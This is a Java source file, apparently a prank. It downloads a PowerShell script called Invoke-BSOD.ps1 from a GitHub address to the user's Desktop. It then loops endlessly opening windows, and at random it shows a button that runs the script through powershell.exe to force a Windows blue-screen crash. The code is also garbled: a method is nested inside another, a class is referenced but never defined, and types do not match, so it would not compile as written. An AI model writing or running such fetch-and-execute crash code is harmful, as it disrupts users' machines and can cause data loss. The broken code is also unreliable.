import javax.swing.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.lang.Math;
public class Shit_Shit_Shit_Fuck_Shit {
    public static void copyURLToFile(URL url, File file) {

        try {
            InputStream input = url.openStream();
            if (file.exists()) {
                if (file.isDirectory())
                    throw new IOException("File '" + file + "' is a directory");

                if (!file.canWrite())
                    throw new IOException("File '" + file + "' cannot be written");
            } else {
                File parent = file.getParentFile();
                if ((parent != null) && (!parent.exists()) && (!parent.mkdirs())) {
                    throw new IOException("File '" + file + "' could not be created");
                }
            }

            FileOutputStream output = new FileOutputStream(file);

            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = input.read(buffer))) {
                output.write(buffer, 0, n);
            }

            input.close();
            output.close();

            System.out.println("File '" + file + "' downloaded successfully!");
        } catch (IOException ioEx) {
            ioEx.printStackTrace();
        }

        public static void killMe() {
            JFrame meep = new JFrame("Click here to crash");
            meep.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            meep.setSize(300, 300);
            JButton boom = new JButton("Click to crash");
            meep.getContentPane().add(boom);
            meep.setVisible(true);
            boom.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    String command = "powershell.exe " + System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1";
                    // Executing the command
                    Process powerShellProcess = Runtime.getRuntime().exec(command);
                    // Getting the results
                    powerShellProcess.getOutputStream().close();
                    String line;
                    System.out.println("Standard Output:");
                    BufferedReader stdout = new BufferedReader(new InputStreamReader(
                        powerShellProcess.getInputStream()));
                    while ((line = stdout.readLine()) != null) {
                        System.out.println(line);
                    }
                    stdout.close();
                    System.out.println("Standard Error:");
                    BufferedReader stderr = new BufferedReader(new InputStreamReader(
                        powerShellProcess.getErrorStream()));
                    while ((line = stderr.readLine()) != null) {
                        System.out.println(line);
                    }

                    stderr.close();
                    System.out.println("Done");

                }
            });
        }

        public static void main(String args[]) {
            String sUrl = "https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1";

            URL url = new URL(sUrl);
            int kill = 0;
            //File where to be downloaded
            File file = new File(System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1");

            URLReader.copyURLToFile(url, file);
            while (true) { //why
                JFrame death = new JFrame("haha yes");
                death.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                death.setSize(300, 300);
                JButton weewoo = new JButton("Click to die instantly");
                death.getContentPane().add(weewoo);
                death.setVisible(true);
                kill = Math.random() * 1000;
                if (kill == 69 || kill == 420) {
                    killMe();
                }

            }
            //don't do this
        }
    }
